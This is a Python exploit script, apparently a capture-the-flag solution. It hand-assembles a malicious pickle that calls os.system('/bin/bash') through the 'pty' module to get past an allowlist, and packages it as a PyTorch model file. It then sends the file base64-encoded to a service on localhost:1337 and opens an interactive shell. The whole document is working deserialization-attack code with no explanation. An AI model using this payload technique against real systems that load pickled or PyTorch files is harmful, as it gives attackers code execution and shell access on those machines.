import base64
import io

import torch
from pickleassem import PickleAssembler
from pwn import *
from torch.serialization import _open_zipfile_writer

if __name__ == "__main__":

    pa = PickleAssembler(proto=4)

    # Just find one of the allowed modules that imports os, then call system
    pa.push_mark()
    pa.push_binstring("/bin/bash")
    pa.build_inst("pty", "os.system")

    payload = pa.assemble()

    data = io.BytesIO()
    data.write(payload)
    data.seek(0)

    data_value = data.getvalue()
    with _open_zipfile_writer("vuln.pkl") as zip_file:
        zip_file.write_record("data.pkl", data_value, len(data_value))

    with open("vuln.pkl", "rb") as f:
        payload = base64.b64encode(f.read())

    r = remote("localhost", 1337)
    r.recvuntil(": ")
    r.sendline(payload)
    r.interactive()
    # print(r.recvall())
